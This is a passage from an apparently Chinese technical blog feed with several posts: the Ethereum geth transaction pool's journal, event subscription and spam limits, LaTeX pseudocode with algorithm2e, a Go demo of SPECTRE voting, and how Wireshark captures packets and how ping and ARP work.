文件是否会跟随本地交易而无限增长？答案是否定的，<strong>虽然无法实时从 journal 中移除交易。但是支持定期更新 journal 文件</strong>。<br><strong>journal 并不是保存所有的本地交易以及历史</strong>，他<strong>仅仅是存储当前交易池中存在的本地交易</strong>。因此交易池会定期对 journal 文件执行 rotate，将交易池中的本地交易写入 journal 文件，并丢弃旧数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">journal := time.NewTicker(pool.config.Rejournal)<br><span class="hljs-comment">//...</span><br><span class="hljs-comment">//core/tx_pool.go:353</span><br><span class="hljs-keyword">case</span> &lt;-journal.C:<br><span class="hljs-keyword">if</span> pool.journal != <span class="hljs-literal">nil</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">if</span> err := pool.journal.rotate(pool.local()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Warn(<span class="hljs-string">&quot;Failed to rotate local tx journal&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br>pool.mu.Unlock()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="新交易信号"><a href="#新交易信号" class="headerlink" title="新交易信号"></a>新交易信号</h2><p>文章开头，有提到<strong>进入交易池的交易将被广播到网络</strong>中。这<strong>是依赖于交易池支持外部订阅新交易事件信号</strong>。任何<strong>订阅此事件的子模块</strong>，在交易池出现新的可执行交易时，均可实时接受到此事件通知，并获得新交易信息。</p><blockquote><p>需要注意的是并非所有进入交易池的交易均被通知外部，而是只有交易从非可执行状态变成可执行状态后才会发送信号。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:705</span><br><span class="hljs-keyword">go</span> pool.txFeed.Send(NewTxsEvent&#123;types.Transactions&#123;tx&#125;&#125;)<br><span class="hljs-comment">//core/tx_pool.go:1022</span><br><span class="hljs-keyword">go</span> pool.txFeed.Send(NewTxsEvent&#123;promoted&#125;)<br></code></pre></td></tr></table></figure><p>在交易池中，有两处地方才会执行发送信号。<br>一是<strong>交易时用于替换已经存在的可执行交易</strong>时。<br>二是有<strong>新的一批交易从非可执行状态提升到可执行状态后</strong>。<br>外部只需要订阅 SubscribeNewTxsEvent(ch chan&lt;- NewTxsEvent)新可执行交易事件，则可实时接受交易。<br>在 geth 中网络层将<strong>订阅交易事件</strong>，以便实时广播。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//eth/handler.go:213</span><br>pm.txsCh = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> core.NewTxsEvent, txChanSize)<br>pm.txsSub = pm.txpool.SubscribeNewTxsEvent(pm.txsCh)<br><span class="hljs-comment">//eth/handler.go:781</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *ProtocolManager)</span> <span class="hljs-title">txBroadcastLoop</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> &#123;<br>      <span class="hljs-keyword">select</span> &#123;<br>      <span class="hljs-keyword">case</span> event := &lt;-pm.txsCh:<br>         pm.BroadcastTxs(event.Txs)<br>      <span class="hljs-comment">//...</span><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>另外是矿工实时订阅交易，以便将交易打包到区块中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//miner/worker.go:207</span><br>worker.txsSub = eth.TxPool().SubscribeNewTxsEvent(worker.txsCh)<br><span class="hljs-comment">//miner/worker.go:462</span><br>txs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Address]types.Transactions)<br><span class="hljs-keyword">for</span> _, tx := <span class="hljs-keyword">range</span> ev.Txs &#123;<br>acc, _ := types.Sender(w.current.signer, tx)<br>   txs[acc] = <span class="hljs-built_in">append</span>(txs[acc], tx)<br>&#125;<br>txset := types.NewTransactionsByPriceAndNonce(w.current.signer, txs)<br>w.commitTransactions(txset, coinbase, <span class="hljs-literal">nil</span>)<br></code></pre></td></tr></table></figure><h1 id="清理交易池"><a href="#清理交易池" class="headerlink" title="清理交易池"></a>清理交易池</h1><p>交易池是完全存在内存中的，因此有大小限制，每当超过一定的阈值就需要清理。实际实现时，pending 的缓冲区容量默认为 4096，queue 的缓冲区容量默认为 1024。<br>清理的时机是交易池满的时候，清理的原则是价格较低的最先清理</p><blockquote><p>但是本项目没有设计要清理交易池</p></blockquote><h1 id="惩罚恶意账号"><a href="#惩罚恶意账号" class="headerlink" title="惩罚恶意账号"></a>惩罚恶意账号</h1><p>这也是 txpool 很重要的一个属性，可以防止恶意账户以发起大量垃圾交易。防止恶意用户造成：</p><ol><li>占用 txpool 空间</li><li>浪费节点大量内存和 CPU</li><li>降低打包性能</li></ol><p>** 只有当交易的总数量超过缓冲区大小时，txpool 才会认为有恶意账户发起大量交易。**pending 和 queued 缓冲区大小不同，但处理策略类似：</p><ol><li>pending 的缓冲区容量是 4096，当 pending 的交易数量多于此时，就会运行检查，每个账号的交易数量是否多于 16，把这些账号搜集出来，进行循环依次清理，什么意思呢？就是每轮只删除（移动到 queued）这些账号的每个账号 1 条交易，然后看数量是否降下来了，不满足再进行下一轮，直到满足。</li><li>queued 的缓冲区容量是 1024，超过之后清理策略和 pending 差不多，但这里可是真删除了。</li></ol><p>该部分功能未抽象成单独的函数，而是在 promoteExecutables()中，就是在每次把 queued 交易转移到 pending 后执行的。<br><strong>本地交易的特权</strong>，txpool 虽然对交易有诸多限制，但如果交易是本节点的账号发起的，以上数量限制等都对他无效。所以，如果你用本节点账号不停的发送交易，并不会被认为是攻击者</p><h1 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h1><ol><li>用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；</li></ol><p>所有与交易请求相关的参数被赋值到一个结构体中，然后进行序列化转变为可存储和传输的形式，最后生成交易并进行签名</p><ol start="2"><li>产生的交易如果不能被及时处理，是如何进入交易池的？</li></ol><p>最终是调用一个 add 函数，添加到了一个队列里</p><ol start="3"><li>本地产生的交易和从网络中接收到的交易进入交易池是否有区别？</li></ol><p>有区别，底层都是调用 add 函数</p><ol start="4"><li>交易池的基本数据结构是怎么样的（优先队列？）</li></ol><p>交易池是一个结构体，核心是 pending 和 queue 两个 map，map 的键是一个地址，值是一个交易链表形成的队列</p><ol start="5"><li>从交易池中提取交易进行打包时顺序是怎么样的（调度算法）</li></ol><p>本地优先级大于远程交易</p><p>我们可以理解为区块链底层利用交易池对并发产生的请求做了<strong>异步化</strong>，<strong>交易产生的时刻</strong>和<strong>交易被打包的时刻</strong>是<strong>随机</strong>的。</p><blockquote><p>在实现 TXpool 的时候为了保证数据的一致性会使用大量的锁</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Basic-scientific-research-series-1-Pseudo-code-specifications</title>
      <link href="/2021/Basic-scientific-research-series-1-Pseudo-code-specifications/"/>
      <url>/2021/Basic-scientific-research-series-1-Pseudo-code-specifications/</url>
      
        <content type="html"><![CDATA[<p>记录一下科研论文中的伪代码。<br>转自：<a href="https://shuzang.github.io/2021/pseudocode-specification/">https://shuzang.github.io/2021/pseudocode-specification/</a></p><a id="more"></a><h2 id="伪代码规范"><a href="#伪代码规范" class="headerlink" title="伪代码规范"></a>伪代码规范</h2><p>伪代码是一种接近自然语言的算法描述形式，其目的是在不涉及具体实现（各种编程语言）的情况下将算法的流程和含义清楚的表达出来，因此它没有一个统一的规范，有的仅仅是在长期的实践过程中形成的一些约定俗成的表达样式。下图是一个简单的例子<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:1">1</a>，但已经包含了大多数主要元素<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618478655345-bb9bd29d-b6e6-4b93-b278-d315a9721d31.png#clientId=u7f037a6a-77db-4&from=paste&height=380&id=u70552d91&originHeight=759&originWidth=668&originalType=url&status=done&style=none&taskId=uef2d862d-a2fb-4d0c-9f58-61f5f43f3ea&width=334"><br>首先需要一个<strong>标题</strong>来描述整个算法，一般还会有一个与之一起的编号。在上图中，算法的标题为「Acesscontrol algorithm flow」，编号为「Algorithm 1」。标题与编号一般位于算法顶部，但也有人放在底部，编号多按全文的算法总数进行索引，但也可以按章节分别进行索引。<br>其次，在正式的算法流之前需要声明<strong>输入和输出</strong>。通常使用关键字 Input 和 Output 来声明，但也有人使用关键字 Data 和 Result。<br>顺序、选择与循环结构是算法的主体。通常，不同的程序块使用缩进来保持结构清晰，但也有不少人使用垂直连接线进行进一步划分，如上图。另外，和编程语言类似，伪代码中的选择和循环使用 if-then-else、while-do 和 for-do 等关键字和结构来描述<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:2">2</a>，举例如下，其中，每个程序块结束的 end 关键字有人选择写，也有人选择不写。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618478672970-c669b4dd-61a3-427a-9366-fae3ba74b0e3.png#clientId=u7f037a6a-77db-4&from=paste&height=461&id=u980d4514&originHeight=922&originWidth=1121&originalType=url&status=done&style=none&taskId=uebf9d8c3-b7d5-4640-bb35-d608225f8f0&width=560.5"><br>算法流程结构<br>赋值操作一般使用左箭头「&lt;—」表示。A[i] 用来表示数组 A 的第 i 个元素，A[1…j] 则表示下标从 1 到 j 的子数组；函数调用使用函数名+传入参数的形式；返回值使用 return 关键字，这些都和常规编程语言相同。需要注意的是，未声明而使用的变量都可以视为算法内的局部变量，如果是全局变量则需要进行解释，可以在上下文中，也可以使用注释；注释的形式也和传统语言相同，使用 // 或 /<em>……</em>/。<br>算法整体通常使用三线框包围，但也有少部分人使用一个完整的框。<br>伪代码的语句一般不需要在末尾使用分号，但行首通常会添加行号。</p><h2 id="2-LaTeX-包"><a href="#2-LaTeX-包" class="headerlink" title="2. LaTeX 包"></a>2. LaTeX 包</h2><p>latex 书写伪代码主要有三种排版格式：algorithm+algorithmic、algorithm+algorithmicx 以及 algorithm2e<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:3">3</a>。我们使用<a href="https://www.ctan.org/pkg/algorithm2e">algorithm2e</a>，它提供了垂直连接线，可以去掉 end 关键字，而且写起来更像编程语言，用着非常舒服。<br>引入 algorithm2e 包使用如下语句</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-tag">\<span class="hljs-name">usepackage</span><span class="hljs-string">[options]</span><span class="hljs-string">&#123;algorithm2e&#125;</span></span><br></code></pre></td></tr></table></figure><p>几个重要的 options 如下</p><ol><li>ruled：让标题显示在上面，默认会显示到最下面；</li><li>vlined：默认启用垂直连接线；</li><li>linesnumbered：让算法显示行号，不包括 input 和 output 部分；</li><li>noend：程序块结束不打印 end。</li></ol><p>常用命令如下<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:4">4</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618478772434-2de2a8b0-44d4-4fe1-838f-75edf92d8921.png#clientId=u7f037a6a-77db-4&from=paste&height=372&id=u452ff8fa&originHeight=743&originWidth=974&originalType=binary&size=52982&status=done&style=none&taskId=u7814261f-55f6-48b7-b9ab-bede03ce98b&width=487"><br>一个官方的例子如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-tag">\<span class="hljs-name">begin</span><span class="hljs-string">&#123;algorithm&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">SetKwData</span><span class="hljs-string">&#123;Left&#125;</span><span class="hljs-string">&#123;left&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwData</span><span class="hljs-string">&#123;This&#125;</span><span class="hljs-string">&#123;this&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwData</span><span class="hljs-string">&#123;Up&#125;</span><span class="hljs-string">&#123;up&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">SetKwFunction</span><span class="hljs-string">&#123;Union&#125;</span><span class="hljs-string">&#123;Union&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwFunction</span><span class="hljs-string">&#123;FindCompress&#125;</span><span class="hljs-string">&#123;FindCompress&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">SetKwInOut</span><span class="hljs-string">&#123;Input&#125;</span><span class="hljs-string">&#123;input&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwInOut</span><span class="hljs-string">&#123;Output&#125;</span><span class="hljs-string">&#123;output&#125;</span></span><br><br><span class="hljs-tag">\<span class="hljs-name">Input</span><span class="hljs-string">&#123;A bitmap $Im$ of size $w\times l$&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">Output</span><span class="hljs-string">&#123;A partition of the bitmap&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">BlankLine</span></span><br><span class="hljs-tag">\<span class="hljs-name">emph</span><span class="hljs-string">&#123;special treatment of the first line&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">For</span><span class="hljs-string">&#123;$i\leftarrow 2$ \KwTo $l$&#125;</span><span class="hljs-string">&#123;</span></span><br><span class="hljs-tag"><span class="hljs-string">\emph&#123;special treatment of the first element of line $i$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">For</span><span class="hljs-string">&#123;$j\leftarrow 2$ \KwTo $w$&#125;</span><span class="hljs-string">&#123;\label&#123;forins&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">Left</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">leftarrow</span></span>$</span> <span class="hljs-tag">\<span class="hljs-name">FindCompress</span><span class="hljs-string">&#123;$Im[i,j-1]$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">Up</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">leftarrow</span></span>$</span> <span class="hljs-tag">\<span class="hljs-name">FindCompress</span><span class="hljs-string">&#123;$Im[i-1,]$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">This</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">leftarrow</span></span>$</span> <span class="hljs-tag">\<span class="hljs-name">FindCompress</span><span class="hljs-string">&#123;$Im[i,j]$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">If</span></span>(<span class="hljs-tag">\<span class="hljs-name">tcp*</span><span class="hljs-string">[h]</span><span class="hljs-string">&#123;O(\Left,\This)==1&#125;</span></span>)&#123;<span class="hljs-tag">\<span class="hljs-name">Left</span></span> compatible with <span class="hljs-tag">\<span class="hljs-name">This</span></span>&#125;&#123;<span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;lt&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">lIf</span><span class="hljs-string">&#123;\Left $&lt;$ \This&#125;</span><span class="hljs-string">&#123;\Union&#123;\Left,\This&#125;</span></span>&#125;<br><span class="hljs-tag">\<span class="hljs-name">lElse</span><span class="hljs-string">&#123;\Union&#123;\This,\Left&#125;</span></span>&#125;<br>&#125;<br><span class="hljs-tag">\<span class="hljs-name">If</span></span>(<span class="hljs-tag">\<span class="hljs-name">tcp*</span><span class="hljs-string">[f]</span><span class="hljs-string">&#123;O(\Up,\This)==1&#125;</span></span>)&#123;<span class="hljs-tag">\<span class="hljs-name">Up</span></span> compatible with <span class="hljs-tag">\<span class="hljs-name">This</span></span>&#125;&#123;<span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;ut&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">lIf</span><span class="hljs-string">&#123;\Up $&lt;$ \This&#125;</span><span class="hljs-string">&#123;\Union&#123;\Up,\This&#125;</span></span>&#125;<br><span class="hljs-tag">\<span class="hljs-name">tcp</span><span class="hljs-string">&#123;\This is put under \Up to keep tree as flat as possible&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;cmt&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">lElse</span><span class="hljs-string">&#123;\Union&#123;\This,\Up&#125;</span></span>&#125;<span class="hljs-tag">\<span class="hljs-name">tcp*</span><span class="hljs-string">[h]</span><span class="hljs-string">&#123;\This linked to \Up&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;lelse&#125;</span></span><br>&#125;<br>&#125;<br><span class="hljs-tag">\<span class="hljs-name">lForEach</span><span class="hljs-string">&#123;element $e$ of the line $i$&#125;</span><span class="hljs-string">&#123;\FindCompress&#123;p&#125;</span></span>&#125;<br>&#125;<br><span class="hljs-tag">\<span class="hljs-name">caption</span><span class="hljs-string">&#123;disjoint decomposition&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;algo_disjdecomp&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">end</span><span class="hljs-string">&#123;algorithm&#125;</span></span><br><br></code></pre></td></tr></table></figure><p>渲染后的样式如下<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618478673624-a5337260-9e18-451c-91b3-0eaad9d766bd.png#clientId=u7f037a6a-77db-4&from=paste&height=310&id=u6b501371&originHeight=619&originWidth=911&originalType=url&status=done&style=none&taskId=u55db2441-adb1-4199-95e7-79ec5ef27e2&width=455.5"><br>注：当前算法选然后条件语句会带有下划线，主要是因为同时使用了 \ulem 包，产生了冲突，去掉该包即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SPECTRE-Coding</title>
      <link href="/2021/SPECTRE-Coding/"/>
      <url>/2021/SPECTRE-Coding/</url>
      
        <content type="html"><![CDATA[<p>虽然这个 paper 可能不是个能 work 的（有很多地方比较牵强，不稳定，且无任何项目声明实现了它），但既然老师要求了，只好硬着头皮上了。</p><a id="more"></a><h1 id="借鉴"><a href="#借鉴" class="headerlink" title="借鉴"></a>借鉴</h1><p>根据经验，我决定先学习一下现有项目中各种共识协议的编写。<br>pow-原理很简单，就是工作量证明，故不用看。<br>pos-选举人制度，具体原理还是可以了解一下的。</p><h2 id="pos–账本共识"><a href="#pos–账本共识" class="headerlink" title="pos–账本共识"></a>pos–账本共识</h2><p>切记，PoS 不是一种确定的定义（算法)，而是一种概念，因此对于不同的平台来说，可以有不同的 PoS 实现。<br>以太坊使用 GHOST，贪婪最重可观察子树协议，作为其分叉选择规则。在 GHOST 协议中，获得投票数最高的分叉将被选为链头（将每个分叉区块及其各自子区块的所有票数计入考虑）。<br>与最长链规则相比， <strong>GHOST 的优点在于能够在网络延迟较高时降低攻击效率，同时最小化链重组的深度</strong>。原因是即使攻击者能够高效地在其分叉链上继续产生区块，尝试使该链成为最长链，GHOST 也会选择另一条票数更高的分叉链。</p><h2 id="pow–挖矿共识"><a href="#pow–挖矿共识" class="headerlink" title="pow–挖矿共识"></a>pow–挖矿共识</h2><p><a href="https://www.yuque.com/docs/share/f47edbdb-8ca4-411b-b78c-1f0ea772ac2c#O7vbh">https://www.yuque.com/docs/share/f47edbdb-8ca4-411b-b78c-1f0ea772ac2c#O7vbh</a><br>挖矿可以设计一个动态调整难度的函数<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2911566/1617631667837-57aa55fc-fa97-4d7c-9fad-03d5e2294519.png#height=790&id=CCHi2&originHeight=790&originWidth=930&originalType=binary%E2%88%B6=1&status=done&style=none&width=930"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/2911566/1617631703569-6b340ff4-4b60-4a6c-8799-e4c81acdec7c.png#height=448&id=Lw1nX&originHeight=448&originWidth=836&originalType=binary%E2%88%B6=1&status=done&style=none&width=836"></p><h1 id="SPECTRE"><a href="#SPECTRE" class="headerlink" title="SPECTRE"></a>SPECTRE</h1><p>根据它的伪代码我写了一个 demo,看起来还不错。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Vote</span><span class="hljs-params">(node1 *dag.Blocknode, node2 *dag.Blocknode, graph *Graph)</span> <span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span> &#123;<br>voteOfnode1 := <span class="hljs-number">0</span><br>voteOfnode2 := <span class="hljs-number">0</span><br><br><span class="hljs-comment">//遍历全局图</span><br>Graph := graph<br><span class="hljs-comment">//这里graph一开始要传dag.Graph这个全局图，之后可以传past集或者future集</span><br><span class="hljs-keyword">for</span> k, z := <span class="hljs-keyword">range</span> Graph.nodes &#123;<br>_, ok1 := Graph.getFuture(node1)[k]<br>_, ok2 := Graph.getFuture(node2)[k]<br><span class="hljs-keyword">if</span> ok1 &amp;&amp; !ok2 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !ok1 &amp;&amp; ok2 &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ok1 &amp;&amp; ok2 &#123;<br><span class="hljs-comment">//取决于past(z)的投票结果</span><br>tem1, tem2 := Vote(node1, node2, Graph.getPast(z))<br><span class="hljs-keyword">if</span> tem1 &gt; tem2 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !ok1 &amp;&amp; !ok2 &#123;<br><span class="hljs-comment">//z的投票结果取决于future(z)的投票结果</span><br>tem1, tem2 := Vote(node1, node2, getFutureToGraph(Graph.getFuture(z)))<br><span class="hljs-keyword">if</span> tem1 &gt; tem2 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> z == node1 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> z == node2 &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">return</span> voteOfnode1, voteOfnode2<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>wireshark抓包原理</title>
      <link href="/2021/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/"/>
      <url>/2021/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>这几天学院研究生复试，院长出了这道题，就是问了 wireshark 的抓包原理，由于我并不太清楚，所以特此记录。</p><a id="more"></a><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1618023149469-2a296e81-a3c5-4c86-a35c-e855b0f96ad2.jpeg#align=left&display=inline&height=463&originHeight=463&originWidth=1102&size=0&status=done&style=none&width=1102"></p><p>网络上传输的数据包<strong>通过网卡进入到网络协议分析器系统</strong>。即<strong>Wireshark 使用的网卡数据复制，只要是经过指定网卡都会被抓取</strong>。<br>  每一个协议分析器内部都维护有一个“<strong>跟踪缓冲区</strong>”内存空间区域。它用于<strong>暂存从网络上面复制而来的数据包流</strong>。数据包流从“捕获过滤器”流入到协议分析器的跟踪缓存区中，该缓冲区中的数据包能够在被捕获之后立即查看或是以其他文件格式保持到磁盘上面。比如 Wireshark 协议分析器工具，打开之后，点击[开始捕获]， 然后便可立刻查看捕获到的数据包信息。此时的这些数据包就是放在协议分析器的“跟踪缓冲区”中的。<br>协议分析器所使用的网卡和网卡驱动程序必须能够支持“<strong>混杂模式操作</strong>（Promiscuous Mode Operation）”。因为<strong>只有运行在混杂模式下的网卡才能够捕获到网络中传输到其他设备的“广播数据包、多播数据包、单播数据包以及错误数据包等等”（</strong>支持 VLAN ,单播，多播等），两者一起协同工作。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618023234035-308938e5-9df1-49c9-a18c-cbf03eb49db6.png#align=left&display=inline&height=375&name=image.png&originHeight=461&originWidth=814&size=234125&status=done&style=none&width=662" alt="image.png"></p><h3 id="混杂模式与监视模式区别"><a href="#混杂模式与监视模式区别" class="headerlink" title="混杂模式与监视模式区别"></a>混杂模式与监视模式区别</h3><p>要弄清混杂模式和监视模式之间的区别：<strong>监视模式仅用于无线卡</strong>，<strong>混杂模式用于无线和有线</strong>。 监控模式使卡无需关联接入点即可侦听无线数据包。 混杂模式使卡可以侦听所有数据包，即使不是针对特定的数据包。</p><blockquote><p>作者：圣手书生黎公子<br>链接：<a href="https://zhuanlan.zhihu.com/p/267640786">https://zhuanlan.zhihu.com/p/267640786</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><h1 id="ping-流程"><a href="#ping-流程" class="headerlink" title="ping 流程"></a>ping 流程</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618127378381-8711b7dc-55aa-4883-8422-2d58c2d56c08.png#align=left&display=inline&height=265&name=image.png&originHeight=265&originWidth=642&size=114805&status=done&style=none&width=642" alt="image.png"><br>在这里，我们搭建了一个 PC+交换机+路由器（文中又称网关）的本地网络</p><p>在一开始，所有机器的 arp 表其实都是空的。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618127469796-3243bc5d-73bb-4426-999a-357d79c4d9b1.png#align=left&display=inline&height=429&name=image.png&originHeight=523&originWidth=828&size=203088&status=done&style=none&width=679" alt="image.png"><br>而此时，让 PC 去进行 ping（使用 ICMP 协议）自己的网关 192.168.1.1，是可以通的。<br>为什么呢？<br>我们分析一下流程。</p><ol><li>PC 首先封装这个 ICMP 数据包，最里面是 ICMP 的数据，数据外面封装 IPV4 包头，IPV4 包头外面是帧头。格式如下：</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618127718780-137b5c86-7c50-48eb-ada4-13f1b3c07994.png#align=left&display=inline&height=219&name=image.png&originHeight=438&originWidth=1550&size=714203&status=done&style=none&width=775" alt="image.png"></p><ol start="2"><li>有个问题是，刚开始 ping 的时候，PC 的 ARP 表项是不知道目的 IP 所对应的 MAC 是多少，那么他怎么获取的呢。</li></ol><p>仔细看数据抓包，有一对 ARP 包：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618127872003-dd2d8b5b-7109-4df7-9d92-d907317974eb.png#align=left&display=inline&height=215&name=image.png&originHeight=430&originWidth=1547&size=653510&status=done&style=none&width=773.5" alt="image.png"><br>就是在发 ICMP 包之前，系统先发了一个 ARP 包！<br>上面的 ARP 请求包大概意思是：我是 192.168.1.99，我的 MAC 是 aabb.cc00.3000，我想问 192.168.1.1 你的 MAC 是多少，收到请回复收到请回复。<br>在 ARP 请求的过程中，SW 